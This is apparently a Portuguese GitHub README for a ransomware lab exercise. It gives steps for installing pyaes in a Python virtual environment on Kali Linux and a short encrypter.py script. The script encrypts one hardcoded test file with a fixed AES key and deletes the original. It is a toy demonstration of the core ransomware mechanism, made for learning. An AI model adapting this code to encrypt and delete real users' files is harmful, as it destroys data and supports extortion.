# Desafio Ransomware

### Configurando as dependencia caso não tenha.

1. **Instalar python3-venv**: Instale a ferramenta para criar ambientes virtuais.
2. **Criar o ambiente virtual**: Use o comando `python3 -m venv myenv` para criar o ambiente.
3. **Ativar o ambiente virtual**: Execute `source myenv/bin/activate` para ativar o ambiente.
4. **Instalar pyaes**: Com o ambiente ativo, instale o pyaes com `pip install pyaes`.
5. **Verificar a instalação**: Entre no Python e use `import pyaes` para confirmar.
6. **Desativar o ambiente virtual**: Use `deactivate` para sair do ambiente.

Agora, você pode usar o pacote **pyaes** no seu projeto de maneira isolada e segura, sem afetar o sistema global do Kali Linux.


### Resutados

#### Sem Criptografia 

![nao_criptografada](https://github.com/user-attachments/assets/ab5bc588-2332-404e-a498-6975fc99c447)

##### codigos usado para encrypter.py


```python
import os
import pyaes

## abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo
os.remove(file_name)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close() ```


#### Criptografado 
![criptografada](https://github.com/user-attachments/assets/a67bdf49-dcf5-4262-99ea-2295575e61c7)
